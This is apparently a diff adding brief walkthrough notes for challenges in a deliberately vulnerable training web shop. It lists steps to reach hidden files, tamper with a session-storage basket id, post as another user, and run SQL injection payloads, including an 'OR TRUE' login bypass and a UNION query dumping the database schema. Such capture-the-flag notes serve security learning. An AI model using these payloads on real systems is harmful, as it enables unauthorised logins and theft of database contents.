@@ -1,0 +1,35 @@
+
+ 
+/score-board
+
+1. 
+go to /about
+click on link
+remove legal.md from path
+click on acquistions.md
+
+2. 
+type below path after ip:port
+/metrics
+
+3.
+login using username as 
+'  OR TRUE -- 
+password as
+anything
+
+4.
+order somthing
+go to application->session storage-> bid
+change bid value
+
+5.
+go to path /rest/products/search?q=
+then q=')
+rest/products/search?q=qwert')) union select 1,2,3,sql,5,6,7,8,9 from sqlite_master--
+
+6.
+login with 2 account
+post some message 
+edit with diff user name
+post new
